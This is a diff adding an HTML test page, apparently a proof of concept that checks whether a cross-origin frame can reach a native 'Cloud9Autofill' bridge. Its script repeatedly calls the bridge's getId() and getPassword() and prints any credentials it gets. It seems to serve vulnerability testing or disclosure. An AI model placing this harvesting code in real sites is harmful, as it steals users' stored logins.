@@ -1,0 +1,24 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Unrelated frame</title>
+<style>body{font:26px system-ui;background:#fff4f4;padding:20px}pre{white-space:pre-wrap;border:3px solid #900;padding:20px}</style>
+<h1>Unrelated cross-origin frame</h1>
+<p>Origin: <span id="origin"></span></p>
+<pre id="result">Waiting for native bridge…</pre>
+<script>
+origin.textContent = location.origin;
+function poll() {
+  const out = {bridgePresent: typeof Cloud9Autofill !== "undefined"};
+  try {
+    if (out.bridgePresent) {
+      out.id = Cloud9Autofill.getId();
+      out.password = Cloud9Autofill.getPassword();
+    }
+  } catch (e) { out.error=String(e); }
+  result.textContent = JSON.stringify(out, null, 2);
+  if (!out.password) setTimeout(poll, 250);
+}
+poll();
+</script>
+
